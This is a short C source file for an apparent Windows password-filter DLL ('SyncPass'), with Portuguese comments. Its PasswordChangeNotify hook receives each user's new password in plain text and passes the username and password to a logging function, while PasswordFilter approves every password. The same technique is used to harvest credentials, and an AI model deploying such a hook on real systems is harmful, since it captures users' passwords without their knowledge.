/*

Este arquivo contem somente as funções da microsoft para alertar no momento da troca da senha.

Por, Marcos Carraro - marcos.g.carraro@gmail.com

*/

#include "SyncPass.h"

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#endif


/* Esta função é que vai ter em texto puro a senha do usuário */
NTSTATUS NTAPI PasswordChangeNotify( PUNICODE_STRING username, ULONG relativeid, PUNICODE_STRING password ){
	char *usernameStr, *passwordStr;

	usernameStr	= calloc(1, (username->Length/2)+1);
	passwordStr	= calloc(1, (password->Length/2)+1);

	wcstombs(usernameStr, username->Buffer, (username->Length/2));
	wcstombs(passwordStr, password->Buffer, (password->Length/2));

	/* Chama função para gravar as informações */
	GravaLog(usernameStr,passwordStr);


	return STATUS_SUCCESS;
}


/* Função que faz a requisição da alteração da senha, apenas retornamos TRUE 
** A password change has been requested */
BOOL NTAPI PasswordFilter( PUNICODE_STRING username, PUNICODE_STRING FullName, PUNICODE_STRING password, BOOL SetOperation ){
	return TRUE;
}


/* Função da inicialização das Funções, para um debug?!? Mas, agora apenas retornamos TRUE */
BOOL NTAPI InitializeChangeNotify( void ){
	return TRUE;
}


